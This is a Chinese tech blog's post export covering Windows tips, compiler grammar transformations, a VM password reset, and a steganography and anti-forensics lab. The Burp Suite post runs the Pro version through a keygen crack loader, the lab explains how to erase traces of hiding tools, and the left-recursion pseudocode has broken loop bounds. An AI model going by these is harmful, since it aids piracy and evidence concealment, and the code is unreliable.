    <content><![CDATA[<p>打开cmd键入<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Powercfg &#x2F;batteryreport</span><br></pre></td></tr></table></figure></div><br><img src="/images/loading.gif" data-original="/posts/7bf2a20c/18457849-e1832f4e01c89ae7.png" alt><a id="more"></a></p>
<p>然后直接用浏览器打开<br><img src="/images/loading.gif" data-original="/posts/7bf2a20c/18457849-f6c8b5b83bb49c3d.png" alt><br>电池损耗率计算如下</p>
<script type="math/tex; mode=display">1-\frac{DESIGN~CAPACITY}{FULL~CHARGE~CAPACITY}</script>]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>Windows技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuite汉化教程</title>
    <url>/posts/d3cb8e1a/</url>
    <content><![CDATA[<p>资源下载。<a id="more"></a></p>
<p>资源链接：<br>链接：<a href="https://pan.baidu.com/s/1VYJGTzbdG5kVqVTVxxbsGQ">https://pan.baidu.com/s/1VYJGTzbdG5kVqVTVxxbsGQ</a><br>提取码：39en </p>
<p><strong>此处演示window系统下使用</strong></p>
<p>下载打开可以看到<br><img src="/images/loading.gif" data-original="/posts/d3cb8e1a/18457849-1f571a3fc182cb23.png" alt><br>其中BurpSuiteCn就是汉化包（burp-loader-keygen.jar是破解包，可自行破解）<br>用记事本打开run.bat</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteCn.jar -Xbootclasspath&#x2F;p:burp-loader-keygen.jar  -Xmx1024m -jar burpsuite_pro_v2.0.11.jar</span><br></pre></td></tr></table></figure></div>
<p>上面那条就是用汉化包运行burpsuite的命令<br>若直接点击run.bat，运行时会有黑框<br>可以采用vbs调用bat脚本<br>start.vbs里内容如下<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">createobject(&quot;wscript.shell&quot;).run &quot;.\run.bat&quot;,0</span><br></pre></td></tr></table></figure></div><br>直接点击run.bat即可运行<br>效果如下<br><img src="/images/loading.gif" data-original="/posts/d3cb8e1a/18457849-34292d9e68acee3b.png" alt><br>如果觉得bat脚本的图标太丑，可以新建vbs脚本的快捷方式，将安装包里的icon64.ico替换图标即可。</p>
<p> <strong>linux系统下的使用</strong></p>
<p>与window版本异曲同工<br>可以将run.bat改成run.sh即可<br>必要的话可在sh脚本中添加cd语句切换到安装目录使用。</p>
]]></content>
      <categories>
        <category>资源分享</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>消除左递归及提取左公因子</title>
    <url>/posts/d8b06fcd/</url>
    <content><![CDATA[<p>消除左递归及提取左公因子的方法。<a id="more"></a></p>
<h1 id="消除左递归"><a href="#消除左递归" class="headerlink" title="消除左递归"></a>消除左递归</h1><h2 id="什么是左递归？"><a href="#什么是左递归？" class="headerlink" title="什么是左递归？"></a>什么是左递归？</h2><p>如果一个文法中有一个非终结符号A使得对某个串α存在一个推导A=》Aα，那么这个文法就是左递归的。递归分为立即左递归和非立即左递归。立即左递归单步即可看出来，非立即左递归</p>
<p>举个例子：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">立即左递归：</span><br><span class="line">A ——&gt; Aα | β</span><br><span class="line"></span><br><span class="line">非立即左递归：</span><br><span class="line"> 1）A→aB</span><br><span class="line"> 2）A→Bb</span><br><span class="line"> 3）B→Ac</span><br><span class="line"> 4）B→d</span><br></pre></td></tr></table></figure></div>
<p>消除立即左递归只需要遵循以下规律进行转换就ok。</p>
<h2 id="立即左递归"><a href="#立即左递归" class="headerlink" title="立即左递归"></a>立即左递归</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">将A ——&gt; Aα | β 转换为</span><br><span class="line"></span><br><span class="line">A ——&gt; β A&#39; </span><br><span class="line">A&#39; ——&gt; α A&#39; |ε</span><br></pre></td></tr></table></figure></div>
<h2 id="非立即左递归"><a href="#非立即左递归" class="headerlink" title="非立即左递归"></a>非立即左递归</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">先将其变为立即左递归</span><br><span class="line"> 1）B→aBc</span><br><span class="line"> 2）B→Bbc </span><br><span class="line"> 3）B→d</span><br><span class="line">可化简为：B→aBc | Bbc | d</span><br><span class="line"></span><br><span class="line">然后按照上面的规则进行转换即可</span><br><span class="line"> 1）B→aBcB&#39; |dB&#39;</span><br><span class="line"> 2）B&#39;→bcB&#39; |ε</span><br><span class="line"></span><br><span class="line">最后进行整合</span><br><span class="line"> 1）A→aB</span><br><span class="line"> 2）A→Bb</span><br><span class="line"> 3）B→(aBc|d)B&#39;</span><br><span class="line"> 4）B&#39;→bcB&#39;|ε</span><br></pre></td></tr></table></figure></div>
<h2 id="通用算法"><a href="#通用算法" class="headerlink" title="通用算法"></a>通用算法</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">以某种顺序排列非终结符A1，A2，……，An；</span><br><span class="line"></span><br><span class="line">for(int i &#x3D; n; i&lt;&#x3D;n; i++) &#123;</span><br><span class="line">	for(int j &#x3D; n; j&lt;&#x3D;i-1; j++) &#123;</span><br><span class="line">		将每个形如 Ai → Ajγ 的产生式替换为产生式组 Ａi → ξ1γ｜ξ2γ｜……｜ξkγ ，</span><br><span class="line">		其中，Aj→a1｜a2｜……｜ak是所有的当前Aj产生式</span><br><span class="line">	&#125;</span><br><span class="line">	消除关于Ai产生式中的直接左递归性</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="提取左公因子"><a href="#提取左公因子" class="headerlink" title="提取左公因子"></a>提取左公因子</h1><h2 id="什么是左公因子？"><a href="#什么是左公因子？" class="headerlink" title="什么是左公因子？"></a>什么是左公因子？</h2><p>和数学中的公因子含义相同，就是公共的因子，而左公因子就是最左边的公因子。</p>
<p>例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">S → aB1|aB2|aB3|aB4|...|aBn|y</span><br></pre></td></tr></table></figure></div>
<p>可以看出前n项拥有一个共同的左公因子：a，所以可以把他提取出来。</p>
<h2 id="提取规则"><a href="#提取规则" class="headerlink" title="提取规则"></a>提取规则</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">S → aS&#39;|y</span><br><span class="line">S&#39;→ B1|B2|B3|...|Bn</span><br></pre></td></tr></table></figure></div>
<p>S → aB1|aB2|aB3|aB4|…|aBn|y<br>可以看出前n项拥有一个共同的左公因子：a，所以可以把他提取出来。</p>
<p>S → aS’|y<br>S’→ B1|B2|B3|…|Bn</p>
]]></content>
      <categories>
        <category>理论知识</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>诸葛建伟第三代蜜网的VNet网络攻防实验环境构建涉及的资源下载</title>
    <url>/posts/aa73b2/</url>
    <content><![CDATA[<p>资源下载。<a id="more"></a></p>
<p>半成品<br>链接：<a href="https://pan.baidu.com/s/1mzAXvQWezJhBI-GX0QJEGg">https://pan.baidu.com/s/1mzAXvQWezJhBI-GX0QJEGg</a><br>提取码：NG81cQ==</p>
<p><img src="/images/loading.gif" data-original="/posts/aa73b2/18457849-afc158e6fe84dd78.png" alt></p>
<p>成品<br>链接：<a href="https://pan.baidu.com/s/1PyAprDjhKR681_GyrYSklQ">https://pan.baidu.com/s/1PyAprDjhKR681_GyrYSklQ</a><br>提取码：f5e6085e01b223e37d768e753a635b38<br><img src="/images/loading.gif" data-original="/posts/aa73b2/18457849-f52718468ceab060.png" alt></p>
]]></content>
      <categories>
        <category>资源分享</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>python一条命令建站</title>
    <url>/posts/dab9e221/</url>
    <content><![CDATA[<h2 id="python-一条命令架站"><a href="#python-一条命令架站" class="headerlink" title="python 一条命令架站"></a>python 一条命令架站</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<p><img src="/images/loading.gif" data-original="/posts/dab9e221/18457849-87fecf4272bb5348.png" alt><br>若冲突则将8888换成其他端口即可<br>编写一个index.html文件，放在所要访问的html目录下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Python User!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello Hacker!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>用ipconfig查看本机ip地址<br><img src="/images/loading.gif" data-original="/posts/dab9e221/18457849-367f610514458032.png" alt><br>在浏览器访问即可<br><img src="/images/loading.gif" data-original="/posts/dab9e221/18457849-a0bafe9726f94e26.png" alt><br>本地访问可用localhost或127.0.0.1<br><img src="/images/loading.gif" data-original="/posts/dab9e221/18457849-451df218a99240e9.png" alt><br>此方法也可用于网络分享文件<br><img src="/images/loading.gif" data-original="/posts/dab9e221/18457849-dfc9c5f8370526d5.png" alt></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo侧边栏站点概览中日志链接失效</title>
    <url>/posts/e6be9949/</url>
    <content><![CDATA[<p>介绍hexo侧边栏站点概览中日志链接失效及其解决办法。<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/e6be9949/image-20200309163626288.png" alt="image-20200309163626288"></p>
<p>点击日志跳转出现如下错误</p>
<p><img src="/images/loading.gif" data-original="/posts/e6be9949/image-20200309163711860.png" alt="image-20200309163711860"></p>
<p>debug如下</p>
<p><img src="/images/loading.gif" data-original="/posts/e6be9949/image-20200309163827767.png" alt="image-20200309163827767"></p>
<p>编辑sidebar.swig文件，强行修改到正确的网址。</p>
<p>重新hexo g&amp;d即可</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>WinXP_Pro虚拟机密码忘记如何打开</title>
    <url>/posts/ff20cc75/</url>
    <content><![CDATA[<p>刚刚下载一个VM_Metasploitable_xpsp1虚拟机，导入VMware后开启界面。</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309131623903.png" alt="image-20200309131623903"></p>
<p>需要密码，试了几个弱密码不成功</p>
<p>用<code>repair</code>文件夹下的<code>SAM</code>文件换了<code>system32/config</code>下的<code>SAM</code>文件依然无法进入界面</p>
<p>于是用老毛桃镜像修改密码。<a id="more"></a></p>
<h1 id="下载老毛桃PE镜像并导入window虚拟机"><a href="#下载老毛桃PE镜像并导入window虚拟机" class="headerlink" title="下载老毛桃PE镜像并导入window虚拟机"></a>下载老毛桃PE镜像并导入window虚拟机</h1><blockquote>
<p>下载链接</p>
<p><a href="http://dl-t1.wmzhe.com/17/17623/WMZ-U-SYSTEM_2013.iso">http://dl-t1.wmzhe.com/17/17623/WMZ-U-SYSTEM_2013.iso</a></p>
<p>百度网盘</p>
<p>链接：<a href="https://pan.baidu.com/s/11CyByr2TPDA3KCiGRlft3Q">https://pan.baidu.com/s/11CyByr2TPDA3KCiGRlft3Q</a><br>提取码：6t8j</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309132637487.png" alt="image-20200309132637487"></p>
<p>然后将其导入window虚拟机</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309132846621.png" alt="image-20200309132846621"></p>
<h1 id="更改开机时间"><a href="#更改开机时间" class="headerlink" title="更改开机时间"></a>更改开机时间</h1><p>在.vmx虚拟机配置文件修改<code>bios.bootDelay=&quot;10000&quot;</code><br>如果没有，就将其添加在后面<br>其中1000为1秒</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309133253516.png" alt="image-20200309133253516"></p>
<p>更改后保存文件</p>
<h1 id="开启虚拟机"><a href="#开启虚拟机" class="headerlink" title="开启虚拟机"></a>开启虚拟机</h1><p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309133652686.png" alt="image-20200309133652686"></p>
<p>按<code>ESC</code></p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309133718640.png" alt="image-20200309133718640"></p>
<p>选择<code>CD-ROM Drive</code></p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309133804835.png" alt="image-20200309133804835"></p>
<p>选择<code>01</code>进入镜像里的PE系统</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309133916793.png" alt="image-20200309133916793"></p>
<p>点击程序内的密码更改</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309134107950.png" alt="image-20200309134107950"></p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309134137112.png" alt="image-20200309134137112"></p>
<p>点击打开</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309134204044.png" alt="image-20200309134204044"></p>
<p>更改口令</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309134301860.png" alt="image-20200309134301860"></p>
<p>输入想要设置的密码，点击<code>OK</code>即可</p>
<p>再<code>保存更改</code></p>
<p><code>重启虚拟机</code></p>
<p>等待倒计时结束后进入虚拟机输入密码</p>
<p><img src="/images/loading.gif" data-original="/posts/ff20cc75/image-20200309134607744.png" alt="image-20200309134607744"></p>
<p>成功进入系统！</p>
]]></content>
      <categories>
        <category>业余技术分享</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>数据隐藏技术</title>
    <url>/posts/3253fafc/</url>
    <content><![CDATA[<p>各种数据的隐藏与反取证。<a id="more"></a></p>
<h1 id="实验1-word中隐藏数据"><a href="#实验1-word中隐藏数据" class="headerlink" title="实验1-word中隐藏数据"></a>实验1-word中隐藏数据</h1><h2 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h2><p>Microsoft Word </p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 1、打开Word输入三行内容，以便进行对比。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126223815997.png" alt="image-20200126223815997"></p>
<p> 2、选取第二行的内容，右键单击选取“字体”，在弹出的设置界面的“效果”一栏会有一个复选框为“隐藏”，选中。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126225525860.png" alt="image-20200126225525860"></p>
<p> 3、点击确定后，选中内容消失，如下图 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126225744158.png" alt="image-20200126225744158"></p>
<p> 4、默认情况下，隐藏文本是不会被打印出来的，如果其他用户想知道文件中是否包含隐藏文本，可以单击“左上角图标”-&gt;“word选项”-&gt;“显示”，选中“隐藏文字”复选框（选中下方打印选项中的“打印隐藏文字”同样可以将隐藏内容打印出来）。如下图。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126230253901.png" alt="image-20200126230253901"></p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126230329867.png" alt="image-20200126230329867"></p>
<p> 5、点击“确定”查看效果 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126230551174.png" alt="image-20200126230551174"></p>
<p> 6、此外，还有一种方式可以发现文档中的隐藏文字。首先保存文件，点击“左上角图标”-&gt;“信息”-&gt;“检查文档”。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126231153029.png" alt="image-20200126231153029"></p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126231241528.png" alt="image-20200126231241528"></p>
<p> 7、开始检查，发现内容。在最下面即可发现文档中具有隐藏文字，我们可以将其删除或用上述的方法来讲它显示出来。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200126231348851.png" alt="image-20200126231348851"></p>
<h1 id="实验2-利用压缩文件进行数据隐藏"><a href="#实验2-利用压缩文件进行数据隐藏" class="headerlink" title="实验2-利用压缩文件进行数据隐藏"></a>实验2-利用压缩文件进行数据隐藏</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p> 将压缩文件附加到图片中。 </p>
<h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 1.将含有需要隐藏信息的txt文本进行压缩生成压缩文件testRar.zip。(文件在c盘的新建文件夹内）如图所示 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200212232343151.png" alt="image-20200212232343151"></p>
<p> 2.在CMD中执行命令“copy /b testRar.jpg + testRar.zip newimage.jpg”或者编写一个后缀为.bat文件来运行。 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BAT"><figure class="iseeu highlight /bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b testRar.jpg + testRar.zip newimage.jpg</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200212232540137.png" alt="image-20200212232540137"></p>
<p> 3、打开新图newimage.jpg发现图片无损毁。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200212232940654.png" alt="image-20200212232940654"></p>
<p> 4.将图片后缀名改为.zip并解压到文件夹。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200212233049394.png" alt="image-20200212233049394"></p>
<h1 id="实验3-图像元数据"><a href="#实验3-图像元数据" class="headerlink" title="实验3-图像元数据"></a>实验3-图像元数据</h1><h2 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="　实验内容"></a>　实验内容</h2><p> 用Opanda PowerExif编辑图像的Exif数据。 </p>
<h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 1.右键单击打开⽬标⽂件的属性查看其详细信息（exif-hidden.jpg）。   </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216204812714.png" alt="image-20200216204812714"></p>
<p> 2.可以发现，在该图片的详细信息中涵盖了许多信息，其中包括图片标题、程序名称、图像ID、尺寸、分辨率、照相机信息、GPS信息、文件信息等。一般情况下，⼈们会忽略图片背后所拥有的元数据信息，而我们可以利用图片的元数据来达到隐藏信息的目的，也可以在调查取证的时候通过元数据获取到有用的内容。下面，我们试者利用工具来编辑图片元数据（Opanda PowerExif），打开工具。利用该软件，我们可以清楚图片中的Exif元数据，也可以进行添加操作。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216205321697.png" alt="image-20200216205321697"></p>
<p> 3.点击“添加”，我们试着来增加图像的作者信息。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216213321602.png" alt="image-20200216213321602"></p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216221508359.png" alt="image-20200216221508359"></p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216221640797.png" alt="image-20200216221640797"></p>
<p> 4.保存图片并查看其属性，可见作者信息已经被添加好。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216222130087.png" alt="image-20200216222130087"></p>
<p> 5.虽然作者信息也可以直接在属性中进行更改，但是我们可以利用工具添加其他无法直接在属性栏中操作的元数据。此种隐藏方法比较简单，但这不失为是一种有效简洁的数据隐藏方式。以上的方法仅仅是在图片属性上的隐写术，而在图片内容中的隐写便显得更具隐蔽性以及复杂性，我们利用jpg图像的信息隐藏软件jphs实现一次隐藏于图片内容中的隐写术，打开软件Jphswin。 <img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216224654409.png" alt="image-20200216224654409"></p>
<p> 6.在工具中打开图片文件。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216224950193.png" alt="image-20200216224950193"></p>
<p> 7.点击“Hide”按钮，输⼊密码。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216225237580.png" alt="image-20200216225237580"></p>
<p> 8.点击“确定”之后选择要包含隐藏信息的文本。   </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216225350447.png" alt="image-20200216225350447"></p>
<p> 9.可以在程序中看到保存信息。   </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200216225627238.png" alt="image-20200216225627238"></p>
<p> 10.打开图片可以发现图片没有遭受到任何损坏。利用软件里seek输入密码可以将隐藏文件内容导出。 </p>
<h1 id="实验4-图片隐写技术"><a href="#实验4-图片隐写技术" class="headerlink" title="实验4-图片隐写技术"></a>实验4-图片隐写技术</h1><h2 id="实验内容-2"><a href="#实验内容-2" class="headerlink" title="实验内容"></a>实验内容</h2><p> 1)      在数字隐写术中，人们通常会用某种程序将消息或文件嵌⼊到另⼀个载体文件中，然后把这个载体文件传送给接受者，接受者利用同样的手段获取载体文件中的消息或文件 <br>2)     数字信息的隐藏方法有很多，主要分为两大类：插入、替换。插入：通过插入方法隐藏信息会插入一些额外内容，除了被隐藏的消息外，还有文件制作工具的标识，这个标识记录了隐写程序处理隐藏载荷的地点。这种方法通常会利用文件格式中的空白部分。替换：通过替换方法隐藏消息会改变消息中的字节或者交换字节顺序。它不会在载体文件中增加任何新的内容，而是通过修改字节或者调整字节位置让人们看不到或者听不到文件内容。 </p>
<h2 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 1.图片中插入隐写的方法有追加插入法和前置插入法<br>追加插入法，在文件末尾附加数据是数字隐写术里最常用、最简单的方法，在前面的实验中，我们使用了Windows系统的copy命令将压缩文件追加进了图片，图片没有遭到损坏。<br>前置插入法，任何可以插入批注内容的文件都可能被插入数据而丝毫不影响视觉效果，例如，JPEG文件最多可以在其中插⼊65533个字节的批注信息。JPEG文件被文件标识符分成不同的区域，每个标识符都以0xFF开头，这些标识符标识着文件的布局、格式和其他详细信息。批注区是数据隐藏的绝好位置，在APPO标识符的作用下，解码器（图像浏览器）无法识别的元数据都被忽略掉了，标识符详细信息如下。   </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200217234819606.png" alt="image-20200217234819606"></p>
<p> 2.修改方法<br>LSB，最低有效位修改法，利用的是24位调色板，调色板中有红、绿、蓝三原色。在一个图像的24位调色板中，每8位表示一个原色，也就是说红、绿、蓝分别有256个色调。在LSB修改法中，8位颜色值的最后一位（最低有效位）由1改为0，由0改为1，或者保持不变，每个字节的最低有效位的组合表示插入的隐藏内容，如果是文本信息的话，这些最低有效位重新组合后，每8位代表一个ASCII字符。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200217235340689.png" alt="image-20200217235340689"></p>
<p>  LSB修改方法适用于24位的图像文件，例如JPEG文件和24位的BMP文件。 </p>
<h1 id="实验5-在PDF文件中隐藏信息"><a href="#实验5-在PDF文件中隐藏信息" class="headerlink" title="实验5-在PDF文件中隐藏信息"></a>实验5-在PDF文件中隐藏信息</h1><h2 id="实验内容-3"><a href="#实验内容-3" class="headerlink" title="实验内容"></a>实验内容</h2><p> 1)    wbStego4.3open是一个开源隐写工具，它可以把文件隐藏到BMP、TXT、HTM和PDF文件中且不会被看出破绽，它也可以用来创建版权标识文件并嵌入到文件中将其隐藏。 </p>
<h2 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 1.打开软件。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000459944.png" alt="image-20200218000459944"><br> 2.默认选择“Encode”。如图2所示<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000506790.png" alt="image-20200218000506790"><br> 3.选择需要隐藏的文件1.txt。如图3所示<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000515874.png" alt="image-20200218000515874"><br> 4.选择载体文件1.pdf。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000526947.png" alt="image-20200218000526947"><br> 5.设置加密信息这里默认。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000535147.png" alt="image-20200218000535147"><br> 6.设置输出文件2.pdf。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000600807.png" alt="image-20200218000600807"><br> 7.默认设置并确定，生成文件2.pdf，用WinHex打开文件，可以发现其中被混入了许多由20和09组成的8位字节。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218000607541.png" alt="image-20200218000607541"><br> 8.将这些8位字节提取出来之后取其最低有效位，组合后便可获得其所代表的ASCII码的二进制形式，然后再把二进制码转换成ASCII码就可以得到原始信息。（20代表0，09代表1） </p>
<h1 id="实验6-反取证-隐藏痕迹"><a href="#实验6-反取证-隐藏痕迹" class="headerlink" title="实验6-反取证-隐藏痕迹"></a>实验6-反取证-隐藏痕迹</h1><h2 id="实验内容-4"><a href="#实验内容-4" class="headerlink" title="实验内容"></a>实验内容</h2><p>  隐藏数据时，用户最容易疏忽的一点就是：除了已嵌入消息的载体文件的痕迹外，还会留下原始的载体文件。除了删除原始的载体文件外，还要在进行数据隐藏操作的计算机上清除数据隐藏程序的痕迹。 </p>
<h2 id="实验步骤-5"><a href="#实验步骤-5" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>  一、 数据隐藏密码<br>1.1    除了载体和数据隐藏程序外，密码也是数据隐藏的要点之一，在载体文件中嵌入消息时一定要使用强密码加密，常见建议如下： a) 不使用操作系统的密码、在网页浏览器中存储的密码或网络设备使用的密码。 b) 密码应包含大小写字母、数字和特殊字符的组合。 c) 如果要把密码保存在某个地方，最好使用安全的密码寄存工具或第三方。 <br>1.2    很多数据隐藏程序在嵌入数据时都会让用户输入自定义的密码，此时最好使用强密码，我们可以使用键盘中的隐藏字符制造强密码，如： a) 按[CTRL]+[ALT]+[C]，输出字符© b) 按[CTRL]+[ALT]+[R]，输出字符® c) 按[CTRL]+[ALT]+[T]，输出字符™ d) 按[CTRL]+[ALT]+[E]，输出字符€ <br>1.3    在密码中使用一个或多个特殊字符可以成功击败很多类型的密码暴力破解工具，这不仅是数据隐藏密码保护的最佳实践，也是一个通用的计算机安全防护技巧。此外，增加密码长度也会使密码破解难度呈指数级增长。 </p>
<p>  二、 隐藏痕迹<br>2.1    在Windows系统中，可以使用cleanmgr工具来清理系统，使其不会残留数据隐藏软件的任何痕迹，在CMD命令行下执行“cleanmgr”。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001313229.png" alt="image-20200218001313229"><br>  2.2    选择磁盘后，便可以选择即将要清理的内容。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001321674.png" alt="image-20200218001321674"><br>  2.3    Windows Server 2008 R2系统（还有Win7、Win8等）会跟踪系统运行的每个程序，并把使用最频繁的程序放到开始菜单中。右键单击菜单栏，点击属性。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001328386.png" alt="image-20200218001328386"><br>  2.4    选择“[开始]菜单”标签，在“隐私”一栏中可以选择是否存储且显示最近打开的项目。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001334178.png" alt="image-20200218001334178"><br>  2.5    或者选择“自定义”，将要显示的项目数设置为0。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001339375.png" alt="image-20200218001339375"></p>
<p><br></p>
<h1 id="实验7-取证"><a href="#实验7-取证" class="headerlink" title="实验7-取证"></a>实验7-取证</h1><h2 id="实验内容-5"><a href="#实验内容-5" class="headerlink" title="实验内容"></a>实验内容</h2><p> 1)  检测可疑系统中是否包含数据隐藏软件的方法有很多，主要包括：检测仍然存在于可疑计算机中的数据隐藏软件；网站页面缓存，查找可能提供数据隐藏软件下载的网页；图像缓存，查找使用并可能下载数据隐藏软件的线索；残留的人工痕迹，表名系统可能安装或运行过数据隐藏软件：注册表、软件卸载残留文件、“Thumb”文件（图像缩略图缓存文件） </p>
